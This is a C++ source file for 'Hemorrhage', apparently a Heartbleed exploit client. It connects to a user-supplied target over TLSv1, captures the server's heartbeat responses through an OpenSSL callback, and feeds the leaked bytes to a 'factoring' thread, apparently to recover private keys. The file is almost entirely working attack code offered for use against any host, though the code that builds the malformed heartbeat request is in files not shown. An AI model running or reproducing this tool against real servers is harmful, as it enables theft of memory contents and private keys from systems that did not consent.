//  Hemorrhage

//  Copyright (C) 2014 Mike Shema (mike@deadliestwebattacks.com)

//  This program is free software; you can redistribute it and/or modify
//  it under the terms of the GNU General Public License as published by
//   the Free Software Foundation; either version 2 of the License, or
//  (at your option) any later version.

//  This program is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//  GNU General Public License for more details.

//  You should have received a copy of the GNU General Public License along
//  with this program; if not, write to the Free Software Foundation, Inc.,
//  51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#include "Lamprey.h"
#include "Plasma.h"

#include <boost/asio.hpp>
#include <boost/asio/impl/src.hpp>
#include <boost/asio/ssl/impl/src.hpp>
#include <string>
#include <thread>

extern "C" {
#include "heartbeat.h"
#include <openssl/ssl.h>
}

static void
cb(int write_p, int version, int content_type, const void *buf, size_t len, SSL *ssl, void *arg)
{
  if(TLS1_RT_HEARTBEAT != content_type)
    return;

  std::cout << "heartbeat " << write_p << "\n";

  if(write_p)
    return;

  if(arg) {
    const char  *start = static_cast<const char*>(buf),
                *end = start + len;

    Plasma *ptr = static_cast<Plasma*>(arg);
    ptr->addBuffer(start, end);
  }
}

int
main(int argc, char *argv[])
{
  using namespace boost::asio;
  using boost::asio::ip::tcp;

  if(argc < 2) {
    std::cerr << "Usage: hemorrhage <target> [port]\n";
    return EXIT_FAILURE;
  }

  std::cout << "Using " << SSLeay_version(SSLEAY_VERSION) << "\n";

try {
  std::string port{"https"},
              target(argv[1]);

  if(argc > 2 && argv[2][0] != '\0') {
    port = argv[2];
  }

  io_service    io_svc;
  tcp::resolver resolver(io_svc);

  tcp::resolver::query query(target, port);
  auto endpoint_iterator = resolver.resolve(query);

  Plasma plasma;

  ssl::context ctx(ssl::context::tlsv1);
  SSL_CTX_set_msg_callback(ctx.native_handle(), cb);
  SSL_CTX_set_msg_callback_arg(ctx.native_handle(), &plasma);

  Lamprey lamprey(io_svc, ctx, endpoint_iterator);
  lamprey.setPlasma(&plasma);

  std::thread factoringThread(&Plasma::start, &plasma);

  io_svc.run();

  plasma.stop();
  factoringThread.join();
}
catch (std::exception& e) {
  std::cerr << "Exception: " << e.what() << std::endl;
}
  return EXIT_SUCCESS;
}

